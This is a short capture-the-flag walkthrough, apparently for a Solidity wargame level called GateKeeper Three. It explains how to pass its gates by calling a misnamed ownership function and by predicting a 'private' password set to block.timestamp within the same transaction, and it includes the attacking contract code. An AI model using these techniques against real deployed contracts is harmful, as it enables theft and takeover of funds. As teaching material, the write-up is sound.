# Gates all around, fluff to confuse you

Much of the code in this one is just to confuse you. The trick is to not lose your focus away from what's valid.

`GateOne` makes sure that you interact through a contract, nothing more.

`GateTwo` is a tad bit more tricky.

The logic is divided between the two contracts.

## GateKeeperThree.sol

```solidity

modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }
```

## SimpleTrick.sol

```solidity

uint256 private password = block.timestamp;

function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }
```

So you'll have to pass in the correct `password` to set `allowEntrance` to `true`, and private variable `password` is set to `block.timestamp` at SimpleTrick's deployment.

You can read the storage slot using `cast storage` to get the password, but that's an additional work and you're lazy. Might as well do `getAllowance` in the same transaction in which `SimpleTrick` is deployed since you're writing a contract anyway.

```solidity
function setUpStuff() public payable {
        //become owner
        gateKeeper.construct0r();
        //deploy SimpleTrick
        gateKeeper.createTrick();
        //set allowEntrance to true in GateKeeperThree by passing the password,
        //which would be the block.timestamp since it's the same transaction as deployment
        gateKeeper.getAllowance(block.timestamp);
        // send 0.001 or more ether to GateKeeperThree
        payable(address(gateKeeper)).transfer(msg.value);
    }
```

And that's it. All that's left to do is enter.

The Gates of Valhalla shall open and receive you in all its glory! Witness!!!
